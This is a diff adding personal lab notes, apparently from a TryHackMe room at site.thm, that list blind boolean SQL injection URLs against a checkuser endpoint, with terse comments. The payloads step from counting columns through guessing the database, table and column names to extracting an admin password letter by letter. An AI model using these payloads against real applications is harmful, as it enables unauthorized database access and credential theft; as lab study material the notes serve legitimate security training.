@@ -1,0 +1,24 @@
+http://site.thm/checkuser?username=admin
+{"taken":"true"}
+
+
+
+http://site.thm/checkuser?username=admin123' UNION SELECT 1,...n;-- <-- cek total column
+
+
+http://site.thm/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like 'a..%';--  <-- get the db name with cycling through alphabet, number, -, _
+
+
+http://site.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='db_name' and table_name like 'a..%';-- <-- get table name with cycling through alphabet, number, -, _
+
+
+http://site.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='db_name' and table_name='table_name';-- <--confirm the name, if TRUE then go on
+
+
+http://site.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='table_name' and COLUMN_NAME like 'a%'; <-- check cols name with cycle through like before
+
+
+http://site.thm/checkuser?username=admin123' UNION SELECT 1,2,3 from table_name where username like 'a%' <-- find the username with cycle through like before
+
+
+http://site.thm/checkuser?username=admin123' UNION SELECT 1,2,3 from table_name where username='admin' and password like 'a%' <-- find the password with cycle through like before
